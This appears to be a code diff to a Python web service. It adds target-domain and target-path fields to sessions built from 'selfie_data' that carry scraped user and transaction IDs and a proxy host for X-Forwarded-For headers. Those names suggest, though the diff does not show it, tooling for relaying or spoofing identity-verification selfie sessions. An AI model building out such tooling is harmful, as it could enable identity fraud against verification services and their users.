@@ -426,6 +426,8 @@ def create_session():
             "user_id": data.get('selfie_data', {}).get('scraped_user_id'),
             "transaction_id": data.get('selfie_data', {}).get('scraped_transaction_id'),
             "proxy": data.get('selfie_data', {}).get('proxy_host_for_client_xff'),
+            "target_domain": data.get('selfie_data', {}).get('target_domain'),
+            "target_path": data.get('selfie_data', {}).get('target_path'),
         }
 
         # Generate unique 4-digit short code
@@ -569,7 +571,7 @@ def get_selfie_data():
         s = json.loads(sess_str)
         return base64.b64encode(json.dumps({
             "success": True, 
-            "data": {"user_id": s.get('user_id'), "transaction_id": s.get('transaction_id'), "proxy_host": s.get('proxy'), "status": s.get('status'), "server_url": s.get('server_url', request.host_url.rstrip('/'))}
+            "data": {"user_id": s.get('user_id'), "transaction_id": s.get('transaction_id'), "proxy_host": s.get('proxy'), "status": s.get('status'), "server_url": s.get('server_url', request.host_url.rstrip('/')), "target_domain": s.get('target_domain'), "target_path": s.get('target_path')}
         }).encode('utf-8')).decode('utf-8')
     except Exception as e: return jsonify({"success": False, "message": str(e)}), 500
 
